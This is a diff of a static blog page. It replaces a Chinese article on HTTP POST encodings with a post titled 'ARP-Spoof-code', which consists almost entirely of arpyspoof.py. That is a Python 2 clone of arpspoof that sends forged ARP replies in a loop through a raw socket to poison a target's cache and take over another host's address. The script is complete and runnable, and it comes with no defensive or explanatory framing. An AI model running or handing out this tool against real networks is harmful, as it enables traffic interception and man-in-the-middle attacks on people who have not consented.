@@ -41,7 +41,7 @@
 <link href="/css/main.css?v=0.5.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="post,http," />
+  <meta name="keywords" content="ARP,spoof," />
 
 
 
@@ -57,16 +57,16 @@
 
 
 
-<meta name="description" content="HTTP/1.1 协议规定的 HTTP 请求方法有">
+<meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021">
 <meta property="og:type" content="article">
-<meta property="og:title" content="四种POST方式">
-<meta property="og:url" content="http://www.ariesin.com/2016/03/23/四种POST方式/index.html">
+<meta property="og:title" content="ARP-Spoof-code">
+<meta property="og:url" content="http://www.ariesin.com/2016/03/24/ARP-Spoof-code/index.html">
 <meta property="og:site_name" content="Ariesin">
-<meta property="og:description" content="HTTP/1.1 协议规定的 HTTP 请求方法有">
-<meta property="og:updated_time" content="2016-03-24T03:09:46.906Z">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021">
+<meta property="og:updated_time" content="2016-03-24T06:02:59.267Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="四种POST方式">
-<meta name="twitter:description" content="HTTP/1.1 协议规定的 HTTP 请求方法有">
+<meta name="twitter:title" content="ARP-Spoof-code">
+<meta name="twitter:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021">
 
 
 
@@ -84,7 +84,7 @@
   };
 </script>
 
-  <title> 四种POST方式 | Ariesin </title>
+  <title> ARP-Spoof-code | Ariesin </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -204,7 +204,7 @@
             
             
               
-                四种POST方式
+                ARP-Spoof-code
               
             
           </h1>
@@ -216,8 +216,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-03-23T11:33:52+08:00" content="2016-03-23">
-              2016-03-23
+            <time itemprop="dateCreated" datetime="2016-03-24T14:01:35+08:00" content="2016-03-24">
+              2016-03-24
             </time>
           </span>
 
@@ -262,38 +262,8 @@
       
 
       
-        <p>HTTP/1.1 协议规定的 HTTP 请求方法有 </p>
-<a id="more"></a>
-<blockquote>
-<p>OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT </p>
-</blockquote>
-<p>这几种。其中 POST 一般用来向服务端提交数据，本文主要讨论 POST 提交数据的几种方式。</p>
-<p>我们知道，HTTP 协议是以 <strong>ASCII</strong> 码传输，建立在<strong>TCP/IP</strong> 协议之上的应用层规范。</p>
-<p>规范把 HTTP 请求分为三个部分：</p>
-<blockquote>
-<p>状态行、请求头、消息主体。类似于下面这样：</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;method&gt; &lt;request-URL&gt; &lt;version&gt;</span><br><span class="line">&lt;headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;entity-body&gt;</span><br></pre></td></tr></table></figure>
-<p>协议规定 POST 提交的数据必须放在消息主体<strong>（entity-body）</strong>中，但协议并没有规定数据必须使用什么编码方式。</p>
-<p>实际上，开发者完全可以自己决定消息主体的格式，只要最后发送的 HTTP 请求满足上面的格式就可以。</p>
-<p>但是，数据发送出去，还要服务端解析成功才有意义。一般服务端语言如 php、python 等，以及它们的 framework，都内置了自动解析常见数据格式的功能。服务端通常是根据请求头（headers）中的 <strong>Content-Type</strong> 字段来获知请求中的消息主体是用何种方式编码，再对主体进行解析。</p>
-<p>所以说到 POST 提交数据方案，包含了 Content-Type 和消息主体编码方式两部分。下面就正式开始介绍它们。</p>
-<p>###application/x-www-form-urlencoded</p>
-<p>这应该是最常见的 POST 提交数据的方式了。浏览器的原生 form 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据。请求类似于下面这样（无关的请求头在本文中都省略掉了）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line"></span><br><span class="line">title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</span><br></pre></td></tr></table></figure></p>
-<p>首先，Content-Type 被指定为 <strong>application/x-www-form-urlencoded</strong>；其次，提交的数据按照 key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL 转码。大部分服务端语言都对这种方式有很好的支持。例如 PHP 中，<strong><code>$_POST[&#39;title&#39;]</code></strong> 可以获取到 title 的值，$_POST[‘sub’] 可以得到 sub 数组。<br>很多时候，我们用 Ajax 提交数据时，也是使用这种方式。例如 JQuery 和 QWrap 的 Ajax，Content-Type 默认值都是「application/x-www-form-urlencoded;charset=utf-8」。</p>
-<p>###multipart/form-data<br>这又是一个常见的 POST 数据提交的方式。我们使用表单上传文件时，必须让 &gt;form 的 enctyped 等于这个值。直接来看一个请求示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;text&quot;</span><br><span class="line"></span><br><span class="line">title</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">PNG ... content of chrome.png ...</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure></p>
-<p>这个例子稍微复杂点。首先生成了一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。然后 Content-Type 里指明了数据是以 mutipart/form-data 来编码，本次请求的 boundary 是什么内容。消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 –boundary 开始，紧接着内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。</p>
-<p>关于 mutipart/form-data 的详细定义，请前往 <strong>rfc1867</strong> 查看。</p>
-<p>这种方式一般用来<strong>上传文件</strong>，各大服务端语言对它也有着良好的支持。</p>
-<p>上面提到的这两种 POST 数据的方式，都是浏览器原生支持的，而且现阶段原生 form 表单也只支持这两种方式。但是随着越来越多的 Web 站点，尤其是 WebApp，全部使用 Ajax 进行数据交互之后，我们完全可以定义新的数据提交方式，给开发带来更多便利。</p>
-<p>###application/jsonapplication/json </p>
-<p>这个 Content-Type 作为响应头大家肯定不陌生。实际上，现在越来越多的人把它作为请求头，用来告诉服务端消息主体是序列化后的 JSON 字符串。由于 JSON 规范的流行，除了低版本 IE 之外的各大浏览器都原生支持 JSON.stringify，服务端语言也都有处理 JSON 的函数，使用 JSON 不会遇上什么麻烦。<br>JSON 格式支持比键值对复杂得多的结构化数据，这一点也很有用。记得我几年前做一个项目时，需要提交的数据层次非常深，我就是把数据 JSON 序列化之后来提交的。不过当时我是把 JSON 字符串作为 val，仍然放在键值对里，以 x-www-form-urlencoded 方式提交。<br>Google 的 AngularJS 中的 Ajax 功能，默认就是提交 JSON 字符串。例如下面这段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;&apos;title&apos;:&apos;test&apos;, &apos;sub&apos; : [1,2,3]&#125;;</span><br><span class="line">$http.post(url, data).success(function(result) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>最终发送的请求是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1 </span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line"></span><br><span class="line">&#123;&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这种方案，可以方便的提交复杂的结构化数据，特别适合 RESTful 的接口。各大抓包工具如 Chrome 自带的开发者工具、Firebug、Fiddler，都会以树形结构展示 JSON 数据，非常友好。但也有些服务端语言还没有支持这种方式，例如 php 就无法通过 $_POST 对象从上面的请求中获得内容。这时候，需要自己动手处理下：在请求头中 Content-Type 为 application/json 时，从 php://input 里获得原始输入流，再 json_decode 成对象。一些 php 框架已经开始这么做了。<br>当然 AngularJS 也可以配置为使用 x-www-form-urlencoded 方式提交数据。如有需要，可以参考这篇文章。</p>
-<p>###XML-RPC（XML Remote Procedure Call）</p>
-<p>它是一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。典型的 XML-RPC 请求是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1 </span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt;</span><br><span class="line">    &lt;methodName&gt;examples.getStateName&lt;/methodName&gt;</span><br><span class="line">    &lt;params&gt;</span><br><span class="line">        &lt;param&gt;</span><br><span class="line">            &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt;</span><br><span class="line">        &lt;/param&gt;</span><br><span class="line">    &lt;/params&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p>
-<p>XML-RPC 协议简单、功能够用，各种语言的实现都有。它的使用也很广泛，如 WordPress 的 XML-RPC Api，搜索引擎的 ping 服务等等。JavaScript 中，也有现成的库支持以这种方式进行数据交互，能很好的支持已有的 XML-RPC 服务。不过，我个人觉得 XML 结构还是过于臃肿，一般场景用 JSON 会更灵活方便。</p>
-
+        <a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python</span><br><span class="line"></span><br><span class="line">#############################################################################</span><br><span class="line">##                                                                         ##</span><br><span class="line">## arpyspoof.py --- clone of arpspoof.                                     ##</span><br><span class="line">##                  See www.arp-sk.org for more infos about ARP cache      ##</span><br><span class="line">##                  poisoning and other tools to do that                   ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">## Copyright (C) 2002  Philippe Biondi &lt;biondi@cartel-securite.fr&gt;         ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">## This program is free software; you can redistribute it and/or modify it ##</span><br><span class="line">## under the terms of the GNU General Public License as published by the   ##</span><br><span class="line">## Free Software Foundation; either version 2, or (at your option) any     ##</span><br><span class="line">## later version.                                                          ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">## This program is distributed in the hope that it will be useful, but     ##</span><br><span class="line">## WITHOUT ANY WARRANTY; without even the implied warranty of              ##</span><br><span class="line">## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##</span><br><span class="line">## General Public License for more details.                                ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">#############################################################################</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import getopt,sys,string</span><br><span class="line">from socket import *</span><br><span class="line">from struct import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ETHER_BROADCAST=&quot;\xff&quot;*6</span><br><span class="line">ETH_P_ETHER=0x0001</span><br><span class="line">ETH_P_IP=0x0800</span><br><span class="line">ETH_P_ARP=0x0806</span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print &quot;Usage: %s [-t target] [-i interface] [-s sleep] host&quot;</span><br><span class="line">    print &quot;\t host : host to take over&quot;</span><br><span class="line">    print &quot;\t target : MAC address of a specific target to ARP poison&quot;</span><br><span class="line">    print &quot;\t sleep : time to sleep (in seconds) between two packets&quot;</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ether(src, dst, type):</span><br><span class="line">    return dst+src+pack(&quot;!H&quot;,type)</span><br><span class="line"></span><br><span class="line">def arp(hw, p, hwlen, plen, op, hwsrc, psrc, hwdst, pdst):</span><br><span class="line">    return pack(&quot;!HHBBH&quot;, hw, p, hwlen, plen, op) + hwsrc + psrc + hwdst + pdst</span><br><span class="line"></span><br><span class="line">def is_at(macsrc,ipsrc):</span><br><span class="line">    return arp(ETH_P_ETHER, ETH_P_IP, 6, 4, 2, </span><br><span class="line">               macsrc, inet_aton(ipsrc), ETHER_BROADCAST, pack(&quot;!I&quot;,INADDR_ANY))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mac2str(a):</span><br><span class="line">    return reduce(str.__add__,map(lambda x: chr(int(x,16)), a.split(&quot;:&quot;)))</span><br><span class="line"></span><br><span class="line">def str2mac(a):</span><br><span class="line">    return &quot;%02x:%02x:%02x:%02x:%02x:%02x&quot; % unpack(&quot;!6B&quot;,a)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    opts=getopt.getopt(sys.argv[1:], &quot;i:t:s:h&quot;)</span><br><span class="line"></span><br><span class="line">    target = &quot;\xff\xff\xff\xff\xff\xff&quot;</span><br><span class="line">    dev = &quot;eth0&quot;</span><br><span class="line">    slptime = 2</span><br><span class="line">    for opt, parm in opts[0]:</span><br><span class="line">        if opt == &quot;-h&quot;:</span><br><span class="line">            usage()</span><br><span class="line">        elif opt == &quot;-t&quot;:</span><br><span class="line">            target = mac2str(parm) # XXX get mac from IP</span><br><span class="line">        elif opt == &quot;-i&quot;:</span><br><span class="line">            dev = parm</span><br><span class="line">        elif opt == &quot;-s&quot;:</span><br><span class="line">	    try:</span><br><span class="line">                slptime = float(parm)</span><br><span class="line">            except ValueError,msg:</span><br><span class="line">                raise getopt.GetoptError(&quot;&apos;sleep&apos; parameter error: &quot;+msg.__repr__(),None)</span><br><span class="line"></span><br><span class="line">    if len(opts[1]) == 0 :</span><br><span class="line">        raise getopt.GetoptError(&quot;&apos;host&apos; parameter missing&quot;,None)</span><br><span class="line">    elif len(opts[1]) &gt; 1 :</span><br><span class="line">        raise getopt.GetoptError(&quot;Too many parameters : [%s]&quot; % string.join(opts[1]),None)</span><br><span class="line">    else:</span><br><span class="line">        host = opts[1][0]</span><br><span class="line"></span><br><span class="line">    print &quot;dev:&quot;, dev</span><br><span class="line">    print &quot;target:&quot;, str2mac(target) </span><br><span class="line">    print &quot;host:&quot;, host</span><br><span class="line">except getopt.error, msg:</span><br><span class="line">    print &quot;ERROR:&quot;,msg</span><br><span class="line">    usage()</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">    print &quot;Interrupted by user&quot;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))</span><br><span class="line">    s.bind((dev, ETH_P_ARP))</span><br><span class="line">    mymac = s.getsockname()[4] </span><br><span class="line">    pkt = ether(mymac, target, ETH_P_ARP) + is_at(mymac, host)</span><br><span class="line">    disp = &quot;%s -&gt; %s   %s is-at %s&quot; % (str2mac(mymac), str2mac(target), host, str2mac(mymac))</span><br><span class="line">    while 1:</span><br><span class="line">    	s.send(pkt)</span><br><span class="line">	print disp</span><br><span class="line">	sleep(slptime)</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -307,9 +277,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/post/" rel="tag">#post</a>
+            <a href="/tags/ARP/" rel="tag">#ARP</a>
           
-            <a href="/tags/http/" rel="tag">#http</a>
+            <a href="/tags/spoof/" rel="tag">#spoof</a>
           
         </div>
       
@@ -318,16 +288,16 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/03/22/正向代理和反向代理的区别/" rel="next" title="正向代理和反向代理的区别">
-                <i class="fa fa-chevron-left"></i> 正向代理和反向代理的区别
+              <a href="/2016/03/24/DNS多线程枚举/" rel="next" title="DNS多线程枚举">
+                <i class="fa fa-chevron-left"></i> DNS多线程枚举
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/03/24/Vimrc-Ariesin/" rel="prev" title="Vimrc-Ariesin">
-                Vimrc-Ariesin <i class="fa fa-chevron-right"></i>
+              <a href="/2016/03/24/爬取子域名-code/" rel="prev" title="爬取子域名-code">
+                爬取子域名-code <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
